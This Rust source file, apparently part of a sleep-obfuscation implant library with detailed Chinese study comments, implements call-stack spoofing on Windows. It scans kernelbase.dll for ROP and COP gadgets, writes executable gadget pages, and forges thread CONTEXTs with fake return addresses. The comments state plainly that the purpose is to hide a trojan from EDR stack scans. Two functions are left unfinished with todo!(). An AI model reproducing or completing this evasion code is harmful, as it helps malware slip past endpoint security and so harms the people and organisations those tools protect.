#![allow(unused)]

// 本模块在项目中的作用:
// 本文件函数的流程图: -> ->
// 每个函数的流程图: -> ->

// 优化:这里用到的伪造栈链,应当自己再找一套,避免因hypnus开源被edr记录,增加被发现的风险.是否有必要,需要严谨论证
use crate::config::Config;
use crate::error::HypnusError::{
    AddRspGadgetNotFound, FailToAllocateGadgetPointerPage, FaileToChangeMemoryToRx,
    FaileToReadIMAGE_RUNTIME_FUNCTIONEntriesFromPdataSection,
    FailedToGetFrameSizeRtlUserThreadStart, MissingUnwindBaseThreadInitThunk,
    MissingUnwindEnumDateFormatsExA, MissingUnwindRtlAcquireSRWLockExclusive,
    MissingUnwindRtlUserThreadStart,
};
use crate::error::Result; // replace anyhow::Result
use crate::gadget::{GadgetKind, scan_runtime};
use crate::hypnus::Obfuscation;
use crate::types::*;
use crate::winapis::{NtAllocateVirtualMemory, NtLockVirtualMemory, NtProtectVirtualMemory};
use crate::{debug_log, stealth_bail};
use core::{ops::Add, ptr::null_mut, slice::from_raw_parts};
use obfstr::obfstr as s;
use puerto::types::{
    CONTEXT, IMAGE_DIRECTORY_ENTRY_EXCEPTION, IMAGE_RUNTIME_FUNCTION, LeapSecondFlags,
};
use puerto::{
    helper::PE,
    winapis::{NT_SUCCESS, NtCurrentProcess},
};
use uwd::ignoring_set_fpreg;

/// provides access to the unwind(exception handling)information of a pe image
///
/// 该pe专门用于处理exception handling
#[derive(Debug)]
pub struct Unwind {
    /// reference to the parsed pe image
    pub pe: PE,
}

impl Unwind {
    pub fn new(pe: PE) -> Self {
        Unwind { pe }
    }

    /// return all runtime function entries
    ///
    /// 作用:
    /// 语法:&[IMAGE_RUNTIME_FUNCTION]:使用&[T]详见注释2
    pub fn entries(&self) -> Option<&[IMAGE_RUNTIME_FUNCTION]> {
        /// pe->ntheader;use crate::helper::PE的同时,也自动引入了在puerto中PE对应的inherent methods.详见注释3
        let nt = self.pe.nt_header()?;

        /// ntheader->optionalheader(IMAGE_OPTIONAL_HEADER64)->datadirectory(IMAGE_DATA_DIRECTORY):(是一个16个元素的数组,每个元素是Image_Data_Directory类型,其中第3个指向Image_Runtime_Function,异常目录):异常目录是os用于stack walk栈回溯/SEH,详细记录了函数的栈/寄存器使用情况.其中VirtualAddress是起始地址,Size是总大小.Size/size_of::<IMAGE_RUNTIME_FUNCTION>就是指定dll中的所有非叶子函数
        ///
        /// 注意静态pe文件和运行时镜像之前的区别:这里只指向IMAGE_RUNTIME_FUNCTION 的起始地址,在实际编译一个dll(如ntdll.dll,其中有几千个函数),编译器在.pdata截取把这几千个IMAGE_RUNTIME_FUNCTION 顺序排列在内存中.
        let dir = unsafe { (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION] };

        if dir.VirtualAddress == 0 || dir.Size == 0 {
            debug_log!("Image_Runtime_Function address or size is empty");
            return None;
        }

        /// 异常目录的地址:IMAGE_DATA_DIRECTORY.VirtualAddress指向的就是IMAGE_RUNTIME_FUNCTION (每个IMAGE_RUNTIME_FUNCTION 记录程序中某个函数的起始/结束地址,及回溯UnwindData信息)
        let addr =
            (self.pe.base as usize + dir.VirtualAddress as usize) as *const IMAGE_RUNTIME_FUNCTION;
        /// 异常目录的长度(Size是struct IMAGE_DATA_DIRECTORY的一个字段)
        let len = dir.Size as usize / size_of::<IMAGE_RUNTIME_FUNCTION>();

        /// Forms a slice of a pe's IMAGE_DATA_DIRECTORY[IMAGE_RUNTIME_FUNCTION]
        Some(unsafe { from_raw_parts(addr, len) })
    }

    /// Finds a runtime function by its RVA:找到指定函数的IMAGE_RUNTIME_FUNCTION信息
    /// offset(RVA):使用puerto::GetProcAddress找到的是目标函数在内存中的真实起始地址.用这个真实起始地址减去模块基址,得到了指定函数在异常目的起始偏移量,即这里的参数offset
    pub fn function_by_offset(&self, offset: u32) -> Option<&IMAGE_RUNTIME_FUNCTION> {
        self.entries()?.iter().find(|f| f.BeginAddress == offset)
    }
}

/// represent a reserved stack region for custom thread execution伪造的函数执行栈帧
///
#[derive(Debug, Default, Clone, Copy)]
pub struct StackSpoof {
    /// address of a gadget_rbp,which realigns the stack(mov rsp,rbp; ret).将备份的真实栈地址的rbp,重新对齐realign到rsp,然后ret继续执行真正的执行流
    gadget_rbp: u64,

    /// stack frame size for BaseThreadInitThunk
    base_thread_size: u32,

    /// stack frame size for RtUserThreadStart
    rtl_user_thread_size: u32,

    /// stack frame size for EnumResourcesW
    enum_date_size: u32,

    /// stack frame size for RtlAcquireSRWLockExclusive
    rlt_acquire_srw_size: u32,

    /// type of gadget(call [rbx] or jmp [rbx])
    gadget: GadgetKind,
}

impl StackSpoof {
    #[inline]
    pub fn new(cfg: &Config) -> Result<Self> {
        let mut stack = Self::alloc_memory(cfg)?;
        stack.frames(cfg)?;
        Ok(stack)
    }

    /// allocates memory required for spoof stack execution:在kernelbase.dll中detect后续应该用call [rbx]还是jmp [rbx],然后将rbp相关的opcode写入第一块内存,然后将第一块内存的地址(指针)写入第二块内存,用于返回真实的执行流.后续在resolve中找到rbx相关的gadget地址并写入假栈.执行时cpu通过call [rbx],读取第二块内存中存放的指针地址,间接跳入第一块内存并执行第一块内存中的rbp相关opcode
    ///
    /// CPU 执行  call [rbx]  ──► 读取第二块内存（获取第一块内存的地址） ──►跳转并执行第一块内存（执行  rbp  相关的机器码恢复栈） ──► 返回真实执行流
    pub fn alloc_memory(cfg: &Config) -> Result<Self> {
        // Check that the algo算法 module contains a gadget `call [rbx]` or `jmp [rbx]` from kernelbase.为什么是kernelbase 见注释1
        let kind = GadgetKind::detect(cfg.modules.kernelbase.as_ptr())?;

        // allocate gadget code:将指定opcode(rbp相关)封装在静态字节流中(&`static [u8])
        let bytes = kind.bytes();

        // 作为NtAllocateVirtualMemory返回的分配后的内存地址
        let mut gadget_code = null_mut();

        // 将1左移12位,得到十进制是4096的i32数:NtAllocateVirtualMemory的参数,表示分配的内存大小.即4K
        let mut code_size = 1 << 12;

        //
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(),
            &mut gadget_code,
            0,
            &mut code_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )) {
            stealth_bail!(
                crate::error::HypnusError::FaileToAllocateMemoryForGadgetCode,
                "failed to allocate memory for gadget code"
            );
        }

        // 将bytes相关的rbp的opcode写入内存(申请的第一块内存中(gadget_code))
        // 为什么使用copy_nonoverlapping见注释4
        unsafe {
            core::ptr::copy_nonoverlapping(bytes.as_ptr(), gadget_code as *mut u8, bytes.len());
        }

        // change protection to rx for execution

        let mut old_protect = 0;
        // 将内存权限改为rx,并保存该块内存的旧权限
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(),
            &mut gadget_code,
            &mut code_size,
            PAGE_EXECUTE_READ as u32,
            &mut old_protect,
        )) {
            stealth_bail!(
                FaileToChangeMemoryToRx,
                "failed to change memory protection for RX"
            )
        }

        // Allocate pointer to gadget:通过分配第二块4k内存
        let mut gadget_ptr = null_mut();
        // 一个内存页大小4096(把1左移12位,换算为十进制=4096)
        let mut ptr_size = 1 << 12;
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(),
            &mut gadget_ptr,
            0,
            &mut ptr_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )) {
            stealth_bail!(
                FailToAllocateGadgetPointerPage,
                "failed to allocate gadget pointer page"
            )
        }

        unsafe {
            // writes the gadget address(mov rsp,rbp; ret)to a pointer page:将第一块内存的绝对地址(代表opcode的指针)写入第二块内存开头的8个字节中
            *(gadget_ptr as *mut u64) = gadget_code as u64;

            // Locks the specified region of virtual memory into physical memory,
            // preventing it from being paged to disk by the memory manager.
            NtLockVirtualMemory(
                NtCurrentProcess(),
                &mut gadget_code,
                &mut code_size,
                VM_LOCK_1,
            );
            NtLockVirtualMemory(
                NtCurrentProcess(),
                &mut gadget_ptr,
                &mut ptr_size,
                VM_LOCK_1,
            );
        }

        Ok(Self {
            gadget_rbp: gadget_ptr as u64,
            gadget: kind,
            ..Default::default()
        })
    }

    /// Resolves stack frame sizes for know windows thread routines using unwind metadata
    pub fn frames(&mut self, cfg: &Config) -> Result<()> {
        // 调用cfg.modules(config.rs中调用了get_ntdll_address)得到一个Modules结构体
        let pe_ntdll = Unwind::new(PE::parse(cfg.modules.ntdll.as_ptr()));
        let pe_kernel32 = Unwind::new(PE::parse(cfg.modules.kernel32.as_ptr()));

        // 通过get_proc_address找到RtlUserThreadStart的va.再减去ntdll基址得到rva.
        // 通过rva在异常目录中(Image_RunTime_Function数组)匹配对应的记录
        // 是伪造栈的最底层
        let Some(rtl_user) = pe_ntdll.function_by_offset(
            cfg.rtl_user_thread.as_u64() as u32 - cfg.modules.ntdll.as_u64() as u32,
        ) else {
            stealth_bail!(
                MissingUnwindRtlUserThreadStart,
                "missing unwind: RtlUserThreadStart"
            )
        };

        // 是RtlUserThreadStart调用的第一个函数BaseThreadInitThunk,确保伪造栈的底部两层的真实
        let Some(base_thread) = pe_kernel32.function_by_offset(
            cfg.base_thread.as_u64() as u32 - cfg.modules.kernel32.as_u64() as u32,
        ) else {
            stealth_bail!(
                MissingUnwindBaseThreadInitThunk,
                "missing unwind: BaseThreadInitThunk"
            )
        };

        // kernel32!EnumDateFormatsExA,原型为枚举当前os支持的所有日期格式.
        // 支持回调,它会遍历内部和数据,每找到一种格式,都会调用一次用户提供的回调函数
        let Some(enum_date) = pe_kernel32.function_by_offset(
            cfg.enum_date.as_u64() as u32 - cfg.modules.kernel32.as_u64() as u32,
        ) else {
            stealth_bail!(
                MissingUnwindEnumDateFormatsExA,
                "missing unwind: EnumDateFormatsExA"
            )
        };

        // RtlAcquireSRWLockExclusive,极为常见的内核同步锁函数.模拟一个看起来很忙又很正常的函数.让edr认为线程在等待资源,降低审计优先级
        let Some(rtl_acquire_srw) = pe_ntdll.function_by_offset(
            cfg.rtl_acquire_lock.as_u64() as u32 - cfg.modules.ntdll.as_u64() as u32,
        ) else {
            stealth_bail!(
                MissingUnwindRtlAcquireSRWLockExclusive,
                "missing unwind: RtlAcquireSRWLockExclusive"
            )
        };

        //ntdll!RtlUserThreadStart：作为所有线程的法定始祖负责初始化 SEH环境，通过计算其栈深来确立伪造栈的物理最底层原点，从而在 EDR溯源审计时为载荷提供“根正苗红”的合法身份证明

        // let-else用于绑定新变量,不能直接解构赋值给已有的结构体字段如self.rtl_user_thread_size(重构中这里不能和上文一样简单的用let else和steal_bail!错误控制)
        // uwd依赖的是dinvk,本项目依赖puerto所以这里使用transmute,以后uwd重构完成不要用transmute了
        unsafe {
            if let Some(size) =
                ignoring_set_fpreg(cfg.modules.ntdll.as_ptr(), core::mem::transmute(rtl_user))
            {
                self.rtl_user_thread_size = size;
            } else {
                stealth_bail!(
                    FailedToGetFrameSizeRtlUserThreadStart,
                    "failed to get frame size: RtlUserThreadStart"
                );
            }
        }

        todo!()
    }

    /// constructs a forged CONTEXT structure simulating a spoofed call chain:通过设置CONTEXT的rip指向ZwWaitForWorkViaWorkerFactory,构造木马在休眠阶段的伪造栈帧,用于edr对木马在休眠期的 什么? 扫描.正因为木马休眠(执行NtWaitForSingleObject时),该伪造的栈帧并不执行;
    ///
    /// EDR会定期扫描所有线程的栈,如果正在运行的代码在栈上没有合法的系统函数,会被判定为注入载荷.
    ///
    /// 作用:本函数把当前线程的CONTEXT改造如下调用链,模拟一个正在休眠/标准的windows系统线程.该函数执行后构造的栈帧示意图详见spoof.md
    ///
    /// This function emulates a legitimate return sequence through:
    /// - `ZwWaitForWorkViaWorkerFactory`
    /// - `RtlAcquireSRWLockExclusive`  
    /// - `BaseThreadInitThunk`  
    /// - `RtlUserThreadStart`
    #[inline]
    pub fn spoof_context(&self, cfg: &Config, ctx: CONTEXT) -> CONTEXT {
        unsafe {
            // Construct a fake execution context for the current thread,
            // simulating a call stack that chains through spoofed return addresses
            let mut ctx_spoof = CONTEXT {
                // CONTEXT_FULL代表接管当前线程下所有寄存器
                ContextFlags: CONTEXT_FULL,
                ..Default::default()
            };

            // set the instruction pointer(rip) to the address of ntdll!ZwWaitForWorkViaWorkerFactory(该函数是win线程池空闲时待命处):cpu即将从该合法函数中返回
            ctx_spoof.Rip = cfg.zw_wait_for_worker.as_u64();

            // compute the spoofed rsp by subtracting减 all stacked frame sizes and extra aligment
            // 从当前栈顶rsp(高地址)向下跳跃5个0x1000(每个4k)共计20k空间.详见注释5
            // 将rsp下移20k,用于edr hook/os内核切换的临时数据,避免这些临时数据覆盖伪造的栈帧,这20k是一片空白的防火墙.以rsp-20k为基准,再下移伪造的函数调用链中函数的栈帧大小和32字节影子空间大小.
            // 除了这20k,还向下扩展了需要的函数大小和32字节影子空间
            ctx_spoof.Rsp = (ctx.Rsp - 0x1000 * 5)
                - (cfg.stack.rtl_user_thread_size
                    + cfg.stack.base_thread_size
                    + cfg.stack.rlt_acquire_srw_size
                    + 32) as u64;

            // Return to mtdll!RtlAcquireSRWLockExclusive + 0x17 (after call):将RtlAcquireSRWLockExclusive内部0x17处的rip地址写入栈空间(这个栈空间是上面ctx_spoof.Rsp扩展的).写入的位置是修改后的新栈顶(低地址).这个写入纯粹是静态decoy诱饵,用来应对edr的被动栈回溯,不会被cpu真正执行
            // 这里为啥是0x17,在spoof.md中
            *(ctx_spoof.Rsp as *mut u64) = cfg.rtl_acquire_lock.as_u64().add(0x17);

            // return to BaseThreadInitThunk + 0x14:在延申的20k空间的下方.在子函数栈帧上方的返回地址槽处,写入器父函数内部的合法返回点(0x14处).
            // (此处为其子函数RtlAcquireSRWLockExclusive执行完ret后,返回到BaseThreadInitThunk内部的合法指令返回点,即代码偏移0x14处的mov指令):模拟BaseThreadInitThunk调用其子函数RtlAcquireSRWLockExclusive的物理行为
            // +8 :跳过返回地址本身8字节.详见spoof.md
            *(ctx_spoof
                .Rsp
                .add((cfg.stack.rlt_acquire_srw_size + 8) as u64) as *mut u64) =
                cfg.base_thread.as_u64().add(0x14);

            // Return to RtlUserThreadStart + 0x21
            *(ctx_spoof
                .Rsp
                .add((cfg.stack.rlt_acquire_srw_size + cfg.stack.base_thread_size + 16) as u64)
                as *mut u64) = cfg.rtl_user_thread.as_u64().add(0x21);

            // End a call stack.伪造调用链在物理空间的终结
            // 三层伪造函数的栈深;24代表三层函数的返回地址
            // 0:win的内存模型中,0/NULL时合法的栈底标志.当os内核/EDR调用RtlVirtualUnwind递归查找父函数时,如果解析出rip在有效模块中会继续回溯,如果解析出的返回地址为0,回溯流程正常终止
            *(ctx_spoof.Rsp.add(
                (cfg.stack.rlt_acquire_srw_size
                    + cfg.stack.base_thread_size
                    + cfg.stack.rtl_user_thread_size
                    + 24) as u64,
            ) as *mut u64) = 0;

            ctx_spoof
        }
    }

    /// Applies a fake call stack layout to a series of thread contexts:在hypnus.rs的ctxs(执行流)中,这10个步骤在物理上逐步执行,为了让每一步能够物理跳转到下一个任务并隐蔽返回地址.通过 1. 扫描add rsp 0x58; ret的rop跳板 2. 将call [rbx]插入每个执行步骤的物理栈帧.从而确保在执行期，当  NtProtectVirtualMemory  这样的函数执行完  ret时，CPU 能够沿着栈上的  add rsp  垫片和  call [rbx]返回到我们的控制流中
    ///
    /// simulating a legitimate execution.
    ///
    /// 1. 在栈上通过物理写入真实的系统函数返回地址,捏造一个合法连贯的假调用链(RtlUserThreadStart ➔ BaseThreadInitThunk ➔ EnumDateFormatsExA)给edr的扫描器看
    /// 2. 通过计算偏移,利用add rsp和call [rbx]这两个ROP零件,把这些假的栈帧串联起来.当定时器触发时,cpu顺着这条链安全的执行“修改保护属性 ➔ 解密 ➔ 还原环境”的全部动作.在hypnus.rs的ctx[5],主线程上下文被强行修改,rip指向WaitForSingleObject时.在WaitForSingleObject休眠阶段,运行时对应ctx[5].此时edr去挂起该线程检查它的堆栈.看到的是ZwWaitForWork → RtlAcquireSRWLock → BaseThreadInitThunk
    pub fn spoof(&self, ctxs: &mut [CONTEXT], cfg: &&Config, kind: Obfuscation) -> Result<()> {
        // 得到kernelbase.dll的运行时函数表(.pdata异常表即image_runtime_function)
        // 因为edr在stack walking时,会去.pdata表中验证每个返回地址是否属于一个合法注册的非叶子函数.我们寻找的gadget必须位于.pdata注册的合法函数体内
        let pe_kernelbase = Unwind::new(PE::parse(cfg.modules.kernelbase.as_ptr()));
        let Some(tables) = pe_kernelbase.entries() else {
            stealth_bail!(
                FaileToReadIMAGE_RUNTIME_FUNCTIONEntriesFromPdataSection,
                "failed to read IMAGE_RUNTIME_FUNCTION entries from .pdata section"
            )
        };

        // Locate the target COP(Call-Oriented Programming) or JOP(Jump-Oriented Programming) gadget:均为绕过DEP(数据执行保护)/ASLR(地址空间随机化),也是rop链的终点
        // gadget_addr为kernelbase.dll中call [rbx]或jmp [rbx]指令地址;gadget_size为包含这个指令的宿主函数在系统注册的栈帧大小
        // kernelbase中包含大量以 0xFF 0x13(call [rbx]) 或0xFF 0x23(jmp [rbp])结尾的gadgets
        let (gadget_addr, gadget_size) = self.gadget.resolve(cfg)?;

        // add rsp, 0x58 ; ret=[0x48, 0x83, 0xC4, 0x58, 0xC3]
        // 在kernelbase模块中,根据runtime_function找到对应的机器码的指令地址(rip目标)和其宿主函数的栈帧大小
        // 0x48(REX.W):扩展前缀,指定接下来的指令操作数为64位;0x83,0xC4(ADD RSP,imm8):0x83为ADD;0xC4指定目标寄存器RSP;0x58:要增加的数值0x58(十进制88),这里add跳过指定的0x58空间,从一个深层的系统函数转到另一个函数,在跳转时需要预留32字节影子空间+寄存器(函数通常会备份3-5个寄存器,每个8字节)+16字节的栈对齐.这里是作者通过大量逆向发现,0x58可以一次性跳过大多数系统函数的prolog,让cpu落在预设的下一个返回地址.0x58怎么计算的,详见注释6
        // 0xC3:RET;tables代表一个Image_runtime_function数组;add_rsp_addr代表找到的gadget在内存中的VA;add_rsp_size代表找到的gadget所占栈空间大小
        let Some((add_rsp_addr, add_rsp_size)) = scan_runtime(
            cfg.modules.kernelbase.as_ptr(),
            &[0x48, 0x83, 0xC4, 0x58, 0xC3],
            tables,
        ) else {
            stealth_bail!(AddRspGadgetNotFound, "add rsp gadget not found")
        };

        unsafe {
            // 当当前线程混淆结束,引导程序回到真实的执行流:通过执行call/jmp [rbp]
            for ctx in ctxs.iter_mut() {
                // 首先执行 rbp=rsp:保存真实的返回地址
                ctx.Rbp = match kind {
                    // rsp赋给rbp:在gadget.rs中,向内存页写入了bytes()返回的收尾opcode :mov rsp,rbp; ret
                    // 在rsp向下拉进行伪造之前,把当前真实的rsp写入rbp.cpu顺着伪造的rop链执行到最后一步,cpu跳转到收尾opcode执行.此时,rsp跳过中间所有的伪造栈帧和20k的gap,回到最开始的真实栈顶位置
                    Obfuscation::Timer | Obfuscation::Wait => ctx.Rsp,
                    // win中,在一个线程中插入APC后,该apc并不立即执行,只有当这个线程进入警惕状态Alertable State时,内核才会派发并执行apc队列中任务.NtTestAlert就是这个强制叫醒去检查并执行用户态apc的
                    Obfuscation::Foliage => {
                        // Inject NtTestAlert as stack return address to trigger APC delivery
                        (ctx.Rsp as *mut u64).write(cfg.nt_test_alert.into());
                        ctx.Rsp
                    }
                };

                  // RBX points to our gadget pointer (mov rsp, rbp; ret):上面alloc_memory 函数中第二块内存写入的gadget的地址
                ctx.Rbx = cfg.stack.gadget_rbp;

                  // Compute total stack size for the spoofed call chain
                ctx.Rsp = (ctx.Rsp - 0x1000 * 10)
                    - (cfg.stack.rtl_user_thread_size
                        + cfg.stack.base_thread_size
                        + (**cfg).stack.enum_date_size
                        + gadget_size
                        + add_rsp_size
                        + 48) as u64;


                         // Stack is aligned?
                if ctx.Rsp % 16 != 0 {
                    ctx.Rsp -= 8;
                }

 // First gadget: add rsp, 0x58; ret(从kernelbase.dll找到的gadget绝对虚拟地址)写入新分配的栈顶rsp指向的第一个8字节内存槽.这里rsp是多大的对齐,为什么只写入了8字节.
                *(ctx.Rsp as *mut u64) = add_rsp_addr as u64;

// Gadget trampoline: call [rbx] || jmp [rbx]
                *(ctx.Rsp.add((add_rsp_size + 8) as u64) as *mut u64) = gadget_addr as u64;

                

            }
        }

        todo!()
    }
}


// ret时:1. cpu的控制单元通过内存总线,读取当前栈顶rsp指向的虚拟地址处的8字节数据;2. rsp+8;3.cpu将第一步读到的8字节数据直接写入rip;之后在下一个时钟周期,cpu译码器无条件从此时的rip指向的内存地址处获取下一条要执行的机器指令
 // 执行的结果是将当前rsp向高地址移动0x58字节,刚好让rsp跳过之前为了模拟假函数环境分配的无用栈空间,让栈顶直接对准下一个需要执行的跳转(即下一个返回地址槽,里面是call [rbx])



// 注释1
// win10以后,kernel32.dll已变为转发动态链接库(forwarder dll):其内大部分api只保留导出符号,其函数体实现/逻辑转到kernelbase.dll
// ntdll.dll是用户态进入内核的最后边界,是edr重点监控的核心.而kernelbase.dll作为win32业务逻辑承载模块,其内部控制流跳转比ntdll.dll频繁/复杂.edr很难对其内部所有通用寄存器跳转无差别的全阻断监听
// win64使用结构化异常处理SEH,其栈回溯依赖PE文件的.pdata节(Exception Directory)记录的栈展开元数据unwind codes.同时如果伪造的返回地址指向一个不具备有效展开元数据的函数段/指令序列与该地址在.pdata中注册栈帧释放规则不匹配,win的虚拟栈展开器(RtlVirtualUnwind)在回溯到该地址时会直接报错/触发异常
// kernelbase.dll是一个体积巨大的库,包含大量具有通用栈结构的帧函数,能够完美支持和匹配伪造栈帧的大小(如BaseThreadInitThunk对应的栈大小)

// 注释2
// 语法:&[IMAGE_RUNTIME_FUNCTION]:1.该函数的目的是去找IMAGE_RUNTIME_FUNCTION(dll的.pdata节中已经存在),避免使用(Option<Vec<IMAGE_RUNTIME_FUNCTION>>),Vec版本会分配heap去存储.&[T]的本质是rust的胖指针(地址和元素数(不是字节数))
// 2. 使用&[T]方便使用迭代器

// 注释3
// pe的类型是通过use puerto::helper::PE引入的.所用通过impl PE实现的固有方法Inherent methods会自动引入该模块(不需要也不能单独use引入某个具体的方法)
// inherent methods:直接写在impl块中的.对于trait方法则必须通过use trait来实现

// 注释4
// core::ptr::copy =C 语言的  memmove(倒着复制);core::ptr::copy_nonoverlapping  = C 语言的  memcpy
// nonoverlapping(无重叠):向编译器保证,源内存(bytes)和目标内存(gadget_code)在空间上绝不会交叉重叠.什么是交叉重叠?为什么交叉重叠下倒着复制不会覆盖未拷贝数据?
// 交叉重叠:在python/java等环境下,当需要复制一段数据,底层会自动申请一块全新/互不干涉的内存.但在c/c++/rust中,为了极致性能,在同一块内存缓冲区就地操作数据(插入/处理网络数据包时),而不是申请新的内存.向一块内存写入数据时,假设源内存占用2-6的位置,目标内存需要4-8的位置.那么4-6的位置既是源区域的一部分,也是目标区域的一部分.源和目的区域就会出现重叠
// 常规的正向复制:从左到右,会发生数据覆盖.逆向复制可疑解决这个问题
// 普通的copy可能会有重叠情况,因此rustc在每次拷贝前都要做复杂的边界检查,了解目标区域没有覆盖源区域.如果覆盖了,它必须倒着复制,防止把还没有拷贝的数据给覆盖掉,速度较慢.
// 这里使用的copy_nonoverlapping:编译器取消上述检查机制,调用cpu底层向量化指令(如AVX/SIMD),把内存字节高效的强行冲刷进去,速度极快.但如果有重叠,会导致素数孙华,引发UB.但在本文件中,bytes是准备好的opcode,gadget_code 是在内存新申请的,二者绝不可能重叠
// 相对调用WriteProcessMemory/RtlCopyMemory等api向内存写入数据,core::ptr::copy_nonoverlapping不留下IAT,避免因edr hook敏感api被发现.因为它只是一个编译器内置指令Intrinsic,在编译出的.exe中,它会被翻译成底层的cpu指令.hook只能挂在API层面,对于cpu的汇编指令级别的内存读写,完全不知道在内存中写入了一段gadget代码
// 以上,如果能确定源/目标数据是不同内存中的,就绝不会有交叉,就可用copy_nonoverlapping （memcpy），享受极致性能.如果是同一数组/同一buffer中左右移动的情况,就必须使用copy memmove来让os判断正向/逆向挪动,避免被数据覆盖.

// 注释5
// 20k怎么计算出来的:
// 1. 保护主线程执行环境:根据整个项目,主线程首先执行RtlCaptureContext.主线程捕获RtlCaptureContext时,虽然将其挂起.但在整个混淆链转换中(从主线程到线程池工作线程的异步调度),os内核/EDR/线程池回调内部,依然可能有部分残留指令执行并使用当前栈(ctx.rsp)附近向下的区域.如果把伪造栈紧贴着ctx.rsp写入,任何微小的写入都可能覆盖主线程原本数据/局部变量/返回地址,一旦解密唤醒后试图恢复主线程环境,程序会因为栈损坏而崩溃(Access Violation).因此需要腾出部分空间确保主线程数据的安全.
// 2. win的栈保护页Guard page限制:win中,栈内存是按需动态提交的.线程创建时,os只commit几十k的物理内存,其余reserve.在已提交和未提交额你存交界,放一个保护也page_guard.当程序正常向低地址使用栈时,若碰到page_guard,cpu会触发STATUS_GUARD_PAGE_VIOLATION异常.win内核捕获此异常后,会自动提交下一页,将page_guard下移.(栈扩张限制:cpu无法跳过保护页去访问未提交区域,如跳过访问会触发STATUS_ACCESS_VIOLATION  导致程序崩溃).
// win64下,默认线程池worker线程通常预先提交64-256k栈空间.20k既保证足够缓冲区,也确保这个地址范围仍在线程池预先提交的栈安全区内,不需要触发栈扩张,避免跳过page_guard导致崩溃的风险.这也是选择gap=20k这个数字的上限
// 以上,在主线程执行调用链期间,经历了多个os和edr的函数调用.这些都会在当前栈中写入一些临时数据.如果这个gap太小,一旦深层嵌套的os调用或edr进行复杂的内存审计,其部分数据会放在rsp下方,栈指针可能向下延申并覆盖掉主线程原本的局部变量.如 edr的hook函数在执行ret返回时,会发现它的返回地址被覆盖了,那么主线程会因为栈被写坏,在内核切换的瞬间直接触发Access Violation（C0000005） 崩溃退出
// 这里也可以设为24k/28k等

// 注释6
// 1. win64栈的16字节对齐:win64 abi规范,cpu执行call指令调用下一个函数之前,rsp必须保持16字节对齐.
// 当父函数执行call,cpu自动将8字节的返回地址压入栈.导致进入子函数时,栈处于非16字节对齐(16n+8).为了让子函数在调用下一级函数时恢复16字节对齐,子函数的prologue必须分配一个大小为8的奇数倍栈空间(如40,56,72,88,104等).这就划定的分配的空间规律
// 2. 编译器在编译这个系统函数的栈帧时,其prologue分配如下:
// 2.1 保存非易失性寄存器.函数需要使用这些寄存器,就必须先push入栈进行备份.每个寄存器占8字节
// 2.2 影子空间:32字节
// 2.3 局部变量与临时对齐空间:函数内部的局部变量需要保证16字节对齐
// let (add_rsp_addr, add_rsp_size) = scan_runtime()在搜索时没有依赖函数名称(微软随时在补丁中更改函数名).其遍历kernelbase.dll的.text代码段,找到包含add rsp,0x58;ret(字节码 48 83 C4 58 C3)的gadget.
// uwd::ignoring_set_fpreg(module, runtime),在底层解析win64 pe文件的.pdata节异常处理目录.微软在编译kernelbase.dll时,不仅生成机器码,还会在.pdata节中为每个非叶子函数生成UNWIND_INFO结构体(解包信息),该结构包含UNWIND_CODE(解包码).UNWIND_CODE是给操作洗头膏的栈回溯说明,其中UWOP_PUSH_NONVOL表示该函数push备份了哪几个非易失性寄存器;UWOP_ALLOC_SMALL  /  UWOP_ALLOC_LARGE该函数的prologue通过sub rsp分配多少字节的局部变量和影子空间
// uwd::ignoring_set_fpreg去读取并累加这些UNWIND_CODE记录的值.如果其记录的值有4个非易失性寄存器(32字节),8个局部变量(64),再加上32字节影子空间.那解包码累加处的add_rsp_size=128字节.这里搜索的及其指令是add rsp, 0x58 （88 字节）.因此,该gadget的宿主函数使用的寄存器和局部变量和影子空间之和必然收敛于0x58的88字节以内